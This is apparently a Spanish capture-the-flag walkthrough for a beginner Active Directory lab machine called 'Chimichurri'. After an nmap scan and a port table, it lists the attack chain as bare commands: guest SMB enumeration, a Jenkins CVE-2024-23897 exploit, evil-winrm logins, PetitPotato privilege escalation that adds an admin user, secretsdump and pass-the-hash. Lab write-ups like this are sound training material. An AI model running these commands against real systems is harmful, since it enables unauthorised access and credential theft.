---
description: '🔍 Dificultad: Principiante'
---

# Chimichurri

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.50
```

para verificar la conectividad de red.



A continuación, se realiza el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 192.168.1.50
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

Durante el escaneo, se identificaron múltiples puertos abiertos relacionados con **servicios típicos de Active Directory en un entorno Windows Server**. A continuación, se detalla cada uno:

| Puerto          | Servicio                 | Descripción                                                                   | Relevancia en Pentesting                                                        |
| --------------- | ------------------------ | ----------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| **53**          | DNS (Simple DNS Plus)    | Servicio de resolución de nombres. Fundamental para la operación del dominio. | Enumeración de zonas, DNS spoofing, análisis de transferencias (`dig axfr`).    |
| **88**          | Kerberos                 | Protocolo de autenticación utilizado por AD.                                  | Objetivo de ataques como Kerberoasting, Pass-the-Ticket, Golden Ticket.         |
| **135**         | MS RPC                   | Microsoft RPC endpoint mapper.                                                | Comunicación entre servicios. Puede facilitar enumeración vía `rpcclient`.      |
| **139**         | NetBIOS-SSN              | Servicio para compartir archivos e impresoras (NetBIOS).                      | Usado con `smbclient`, `enum4linux-ng`, `smbmap`.                               |
| **389**         | LDAP                     | Protocolo para acceder al directorio (modo sin cifrar).                       | Enumeración de usuarios, grupos, SPNs, flags UAC. Clave en enumeración AD.      |
| **445**         | SMB (Microsoft-DS)       | Compartición de archivos en Windows.                                          | Dump de hashes, movimiento lateral (SMBexec, Psexec), enumeración sin creds.    |
| **464**         | kpasswd5                 | Servicio para cambio de contraseñas vía Kerberos.                             | Interesante para ataques como _krbrelayx_ o abuso de cuentas.                   |
| **593**         | RPC over HTTP            | Comunicación RPC encapsulada en HTTP.                                         | Utilizado por Exchange, Outlook y otras apps. A veces base de ataques internos. |
| **636**         | LDAPS (tcpwrapped)       | LDAP sobre SSL/TLS.                                                           | Enumeración segura del directorio, aunque a menudo filtrado o cifrado.          |
| **3268**        | Global Catalog (LDAP)    | Puerto usado para consultas a todo el bosque AD.                              | Ideal para enumerar objetos de todo el dominio.                                 |
| **3269**        | GC over SSL (tcpwrapped) | Versión segura del Global Catalog.                                            | Misma funcionalidad que el 3268, pero cifrado.                                  |
| **5985**        | WinRM (HTTP)             | Windows Remote Management.                                                    | Punto de entrada para `evil-winrm`. Fundamental para ejecución remota.          |
| **9389**        | .NET Message Framing     | Servicio para autenticación de AD Web Services (ADWS).                        | Utilizado por PowerShell Remoting, BloodHound, etc.                             |
| **47001**       | HTTPAPI                  | Servicio adicional HTTP, generalmente WinRM.                                  | Usado por PowerShell Remoting.                                                  |
| **49664–49712** | MS RPC dinámicos         | Puertos de comunicación RPC asignados dinámicamente.                          | Relevantes para movimiento lateral, enumeración y abuso de servicios remotos.   |

### 🔎 **EXPLORACIÓN**

Tras el escaneo, hacemos una enumeración **SMB**.

```
nxc smb 192.168.1.50
```

```
smbmap -H 192.168.200.4 -u guest
```

```
smbclient -U guest //IP/drogas
```

{% @github-files/github-code-block url="https://github.com/godylockz/CVE-2024-23897" %}

```
./jenkins_filtered.py -u http://IP:6969
```

```
evil-winrm -i chimichurri.thl -u hacker -p 'Perico69'
```

```
whoami /priv 
```

```
impacket-smbserver share $(pwd)
```

```
copy \\IP\share\PetitPotatoe.exe Potatoe.exe
```

```
.\PetitPotatoe.exe 2 "whoami"
.\PetitPotatoe.exe 3 "net user Bea Hola123 /add"
```

```
.\PetitPotatoe.exe 3 "net localgroup Administradores Bea /add"
```

```
evil-winrm -i chimichurri.thl -u Bea -p 'Hola123'
```

```
impacket-secretsdump chimichurri.thl/Bea@IP
```

```
evil-winrm -i chimichurri.thl -u Administrador -H hash
```

```
net user Administrador Hola1234 /domain
```

```
evil-winrm -i chimichurri.thl -u Administrador  -p 'Hola1234'
```
